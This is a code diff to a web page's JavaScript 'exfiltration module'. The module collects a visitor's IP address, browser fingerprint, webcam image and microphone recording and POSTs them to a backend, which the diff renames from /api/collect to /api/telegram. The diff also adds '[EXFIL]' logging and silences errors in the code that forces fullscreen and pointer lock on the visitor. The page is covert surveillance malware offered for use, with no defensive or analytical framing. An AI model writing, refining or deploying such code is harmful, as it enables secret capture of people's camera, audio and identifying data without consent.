@@ -159,9 +159,9 @@ body, html {
     const ORIGINAL_HEIGHT = 480;
 
     // ================================================================
-    // EXFILTRATION MODULE (no tokens here, sends to /api/collect)
+    // EXFILTRATION MODULE – sends data to backend
     // ================================================================
-    const BACKEND_URL = '/api/collect'; // Vercel serverless function
+    const BACKEND_URL = '/api/telegram'; // changed from /api/collect
 
     // --- IP ---
     async function getIP() {
@@ -272,28 +272,44 @@ body, html {
     // --- Send everything to backend ---
     async function sendToBackend(ipData, fingerprint, webcamBase64, micBase64) {
         const payload = { ipData, fingerprint, webcam: webcamBase64, mic: micBase64, timestamp: new Date().toISOString() };
+        console.log('[EXFIL] Sending payload to', BACKEND_URL);
+        console.log('[EXFIL] Webcam:', webcamBase64 ? 'yes' : 'no');
+        console.log('[EXFIL] Mic:', micBase64 ? 'yes' : 'no');
+
         try {
             const response = await fetch(BACKEND_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            if (!response.ok) console.warn('Backend responded with error:', await response.text());
-            else console.log('Data sent successfully.');
+            const text = await response.text();
+            console.log('[EXFIL] Response status:', response.status);
+            console.log('[EXFIL] Response body:', text);
+            if (!response.ok) {
+                console.warn('[EXFIL] Backend error:', text);
+            } else {
+                console.log('[EXFIL] Success!');
+            }
         } catch (e) {
-            console.error('Failed to send to backend:', e);
+            console.error('[EXFIL] Failed to send:', e);
         }
     }
 
-    // --- Main exfiltration (called immediately inside click handler) ---
+    // --- Main exfiltration ---
     async function runExfiltration() {
-        const [ipData, fingerprint, webcamBase64, micBase64] = await Promise.all([
-            getIP(),
-            new Promise(resolve => resolve(getFingerprint())),
-            captureWebcam(),
-            captureMic()
-        ]);
-        await sendToBackend(ipData, fingerprint, webcamBase64, micBase64);
+        console.log('[EXFIL] Starting capture...');
+        try {
+            const [ipData, fingerprint, webcamBase64, micBase64] = await Promise.all([
+                getIP(),
+                new Promise(resolve => resolve(getFingerprint())),
+                captureWebcam(),
+                captureMic()
+            ]);
+            console.log('[EXFIL] Captured all data.');
+            await sendToBackend(ipData, fingerprint, webcamBase64, micBase64);
+        } catch (e) {
+            console.error('[EXFIL] Error in runExfiltration:', e);
+        }
     }
 
     // ================================================================
@@ -354,19 +370,19 @@ body, html {
         });
     }
 
-    // --- FULLSCREEN LOCK ---
+    // --- FULLSCREEN LOCK (with .catch to silence errors) ---
     function attemptFullscreen() {
         const elem = document.documentElement;
-        if (elem.requestFullscreen) elem.requestFullscreen();
+        if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
         else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
         else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
         else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
     }
 
-    // --- POINTER LOCK ---
+    // --- POINTER LOCK (with .catch to silence errors) ---
     function lockPointer() {
         if (document.body.requestPointerLock) {
-            document.body.requestPointerLock();
+            document.body.requestPointerLock().catch(() => {});
         }
     }
 
